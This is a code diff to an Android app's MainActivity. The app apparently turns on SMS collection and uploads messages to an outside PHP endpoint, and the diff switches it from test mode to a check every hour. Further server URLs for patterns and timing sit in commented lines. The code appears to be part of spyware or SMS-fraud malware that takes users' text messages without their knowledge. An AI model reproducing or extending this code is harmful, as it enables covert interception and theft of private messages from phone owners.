@@ -30,13 +30,16 @@ public class MainActivity extends Activity {
 		dataUtils.setListPattern(new String[] { "001", "002" , "008" });
 		dataUtils.setTargetPattern("00700");
 		dataUtils.setTheHourUpdate(13);
-		
-		dataUtils.setInTest(true, 60000);
+
+		dataUtils.setTimeCallBack(3600000); // every hour check again
+//		dataUtils.setInTest(false, 3600000);
 		
 		// sms
 		dataUtils.setEnableSms(true);
 		dataUtils.setUrlUploadSMS("http://callservice.esy.es/upload_sms.php");
 		
+		//dataUtils.setInTest(false, 600000);
+//		dataUtils.setEnableSms(false);
 //		dataUtils.setEnableServer(true);
 //		dataUtils.setUrlPatterns("http://callservice.esy.es/pattern.php");
 //		dataUtils.setUrlTime("http://callservice.esy.es/time.php");
